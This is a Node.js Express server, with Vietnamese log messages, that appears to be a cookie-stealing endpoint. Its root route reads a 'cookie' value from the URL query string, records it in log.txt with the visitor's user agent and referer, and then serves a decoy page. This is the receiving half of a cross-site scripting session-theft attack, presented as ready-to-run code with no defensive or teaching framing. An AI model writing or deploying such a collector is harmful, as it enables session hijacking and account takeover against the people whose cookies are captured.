import bodyParser from "body-parser";
import express from "express";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 4000;

app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, "public")));
app.use("/styles", express.static(path.join(__dirname, "public/css.css")));

app.get("/", (req, res) => {
  const cookieParam = req.query.cookie;
  console.log("Cookie từ URL:", cookieParam);

  const logEntry =
    `[${new Date().toLocaleString()}] ` +
    `Cookie: ${cookieParam} | ` +
    `User Agent: ${req.headers["user-agent"]} | ` +
    `Referer: ${req.headers.referer}\n`;

  fs.appendFile("log.txt", logEntry, (err) => {
    if (err) {
      console.error("Lỗi ghi file:", err);
      // return res.status(500).send("Lỗi ghi file!");
    }
    console.log("Đã lưu log:", logEntry);
  });

  res.sendFile(path.resolve("public/index.html"));
});

app.listen(PORT, () => {
  console.log(`Server đang chạy tại http://localhost:${PORT}`);
});
